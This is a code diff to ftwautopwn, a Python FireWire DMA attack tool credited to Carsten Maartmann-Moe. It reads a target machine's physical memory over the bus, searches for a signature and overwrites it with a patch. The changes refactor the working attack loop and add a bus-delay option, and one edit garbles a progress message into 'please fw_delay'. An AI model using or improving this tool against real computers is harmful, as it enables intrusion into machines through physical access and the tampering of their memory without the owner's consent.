@@ -11,11 +11,14 @@ from time import sleep
 import getopt
 import sys
 from ftwautopwn.util import print_msg
-#from util import print_msg
 import configparser
 
-VERBOSE = False
+# Constants
 PAGESIZE = 4096
+
+# Global variables
+verbose = False
+fw_delay = 30
 
 def findsig(d, sig, off):
     # Skip the first 1 MiB of memory
@@ -24,10 +27,11 @@ def findsig(d, sig, off):
         # Prepare a batch of 128 requests
         r = [(addr + PAGESIZE * i, len(sig)) for i in range(0, 128)]
         for caddr, cand  in d.readv(r):
-            sys.stdout.write('[+] Searching for signature, %4d MiB so far...\r' % ((caddr / 1024) / 1024))
-            sys.stdout.flush()
             if cand == sig: return caddr
-            addr += PAGESIZE * 128
+        mibaddr = addr/(1024*1024)
+        sys.stdout.write('[+] Searching for signature, %4d MiB so far...\r' % mibaddr)
+        sys.stdout.flush()
+        addr += PAGESIZE * 128
 
 def usage():
     print('''Usage: ftwautopwn [OPTIONS] -t target
@@ -72,14 +76,16 @@ def initialize_fw(d):
     b = Bus()
     # Enable SBP-2 support to ensure we get DMA
     b.enable_sbp2()
-    for i in range(30, 0, -1):
-        sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait %2d seconds\r' % i)
+    for i in range(fw_delay, 0, -1):
+        sys.stdout.write('[+] Initializing bus and enabling SBP2, please fw_delay %2d seconds\r' % i)
         sys.stdout.flush()
         sleep(1)
     # Open the first device
     d = b.devices()[0]
     d.open()
+    print()
     print_msg('+', 'Done, attacking!\n')
+    return d
 
 
 def main(argv):
@@ -92,7 +98,7 @@ def main(argv):
     print('by Carsten Maartmann-Moe 2011\n')
     
     try:
-        opts, args = getopt.getopt(argv, 'hlvt:', ['help', 'list', 'verbose', 'target='])
+        opts, args = getopt.getopt(argv, 'hlvt:w:', ['help', 'list', 'verbose', 'target=', 'fw_delay='])
     except getopt.GetoptError as err:
         print(err)
         usage()
@@ -105,15 +111,16 @@ def main(argv):
             list_targets(config)
             sys.exit()
         elif opt in ('-v', '--verbose'):
-            global VERBOSE
-            VERBOSE = True
+            global verbose
+            verbose = True
         elif opt in ('-t', '--target'):
-            target = str(arg)
+            target = int(arg)
+        elif opt in ('-w', '--fw_delay'):
+            global fw_delay
+            fw_delay = int(arg)
         else:
             assert False, 'Unhandled option: ' + opt
 
-    '''if len(args) < 1: # Print usage if no arguments are given
-        usage()'''
     list_targets(config)
     selected_target = select_target(config)
     
@@ -128,17 +135,13 @@ def main(argv):
     print_msg('+', 'Using patch: ' + hexlify(patch).decode(encoding))
     print_msg('+', 'Using offset: ' + str(off))
     
-    #test
-    #for i in range(0, 1 * 1024 * 1024 * 1024, 1024):
-    #    sys.stdout.write('[+] Searching for signature, %4d MiB so far...\r' % (i/1024/1024))
-    #    sys.stdout.flush()
-    
     d = None
-    initialize_fw(d)
+    d = initialize_fw(d)
     
     try:
         # Find
         addr = findsig(d, sig, off)
+        print()
         print_msg('+', 'Signature found at %d.' % addr)
         # Patch and verify
         d.write(addr, patch)
